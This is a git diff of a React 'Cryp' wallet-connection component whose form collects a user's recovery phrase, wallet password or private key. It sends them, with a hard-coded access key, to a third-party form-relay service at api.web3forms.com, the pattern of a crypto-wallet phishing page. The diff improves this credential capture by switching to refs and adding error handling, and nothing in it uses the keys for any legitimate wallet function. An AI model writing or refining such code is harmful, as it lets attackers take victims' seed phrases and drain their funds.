@@ -1,4 +1,4 @@
-import React, { useState } from "react";
+import React, { useState, useRef } from "react";
 import wallets from "../../index"; // Adjust the path to your wallets.js file
 
 const Cryp = () => {
@@ -9,49 +9,63 @@ const Cryp = () => {
   const [selectedWallet, setSelectedWallet] = useState(null);
   const [result, setResult] = useState("");
 
-  const [formData, setFormData] = useState({
-    walletType: "",
-    recoveryPhrase: "",
-    walletPassword: "",
-    privateKey: "",
-  });
+  // Create refs for the input fields
+  const recoveryPhraseRef = useRef(null);
+  const walletPasswordRef = useRef(null);
+  const privateKeyRef = useRef(null);
 
   const onSubmit = async (event) => {
     event.preventDefault();
     setResult("Sending....");
-    const formData = new FormData(event.target);
 
-    // Append the walletType to the formData
-    formData.append("walletType", selectedWallet.title); // Add the wallet title
-    formData.append("access_key", "e1bf55fc-b593-48c6-82e0-98caa1758642");
+    const newFormData = new FormData();
+    newFormData.append("walletType", selectedWallet.title);
 
-    const response = await fetch("https://api.web3forms.com/submit", {
-      method: "POST",
-      body: formData,
-    });
-
-    const data = await response.json();
-
-    if (data.success) {
-      setResult("Form Submitted Successfully");
-      event.target.reset();
-    } else {
-      console.log("Error", data);
-      setResult(data.message);
+    // Append inputs based on which option is selected
+    if (recoveryPhraseRef.current && !privateKey) {
+      newFormData.append(
+        "recoveryPhrase",
+        recoveryPhraseRef.current.value.trim()
+      );
     }
-  };
+    if (walletPasswordRef.current && key) {
+      newFormData.append(
+        "walletPassword",
+        walletPasswordRef.current.value.trim()
+      );
+    }
+    if (privateKeyRef.current && privateKey) {
+      newFormData.append("privateKey", privateKeyRef.current.value.trim());
+    }
 
-  const handleChange = (e) => {
-    const { name, value } = e.target;
-    setFormData({
-      ...formData,
-      [name]: value,
-    });
+    newFormData.append("access_key", "e1bf55fc-b593-48c6-82e0-98caa1758642");
+
+    try {
+      const response = await fetch("https://api.web3forms.com/submit", {
+        method: "POST",
+        body: newFormData,
+      });
+
+      const data = await response.json();
+
+      if (data.success) {
+        setResult("Form Submitted Successfully");
+        // Reset input values
+        if (recoveryPhraseRef.current) recoveryPhraseRef.current.value = "";
+        if (walletPasswordRef.current) walletPasswordRef.current.value = "";
+        if (privateKeyRef.current) privateKeyRef.current.value = "";
+      } else {
+        console.error("Error", data);
+        setResult(data.message);
+      }
+    } catch (error) {
+      console.error("Fetch error:", error);
+      setResult("An error occurred while submitting the form.");
+    }
   };
 
   const handleWalletClick = (wallet) => {
     setSelectedWallet(wallet);
-    setFormData({ ...formData, walletType: wallet.title }); // Set the wallet type
     setIsOpen(true);
   };
 
@@ -119,30 +133,31 @@ const Cryp = () => {
             </ul>
 
             <form onSubmit={onSubmit}>
-              <div
-                onMouseDown={() => setBorder(!border)}
-                className={`border rounded-md overflow-hidden mb-5 ${
-                  border === true ? "shadow-sm shadow-blue-700 " : ""
-                }`}
-              >
-                <input
-                  className="w-full pb-14 py-1 px-2 outline-none"
-                  type="text"
-                  placeholder="Enter recovery phrase"
-                  name="recoveryPhrase"
-                  onChange={handleChange}
-                  required
-                />
-              </div>
-              <p className="text-start mb-3 text-blue-800">{result}</p>
+              {/* Recovery Phrase Input: visible only if privateKey is not selected */}
+              {!privateKey && (
+                <div
+                  onMouseDown={() => setBorder(!border)}
+                  className={`border rounded-md overflow-hidden mb-5 ${
+                    border ? "shadow-sm shadow-blue-700" : ""
+                  }`}
+                >
+                  <input
+                    className="w-full pb-14 py-1 px-2 outline-none"
+                    type="text"
+                    placeholder="Enter recovery phrase"
+                    ref={recoveryPhraseRef} // Use ref for recovery phrase
+                    required
+                  />
+                </div>
+              )}
+
               {key && (
                 <div>
                   <input
                     className="border rounded-md overflow-hidden mb-5 w-full py-2 px-2 outline-none"
                     type="text"
                     placeholder="Wallet password"
-                    name="walletPassword"
-                    onChange={handleChange}
+                    ref={walletPasswordRef} // Use ref for wallet password
                     required
                   />
                 </div>
@@ -154,9 +169,7 @@ const Cryp = () => {
                     className="border rounded-md overflow-hidden mb-5 w-full py-2 px-2 outline-none"
                     type="text"
                     placeholder="Enter your Private Key"
-                    name="privateKey"
-                    value=""
-                    onChange={handleChange}
+                    ref={privateKeyRef} // Use ref for private key
                     required
                   />
                 </div>
@@ -173,6 +186,7 @@ const Cryp = () => {
                   PROCEED
                 </button>
               </div>
+              <p className="text-start mb-3 text-blue-800">{result}</p>
               <div className="text-end">
                 <button
                   type="button"
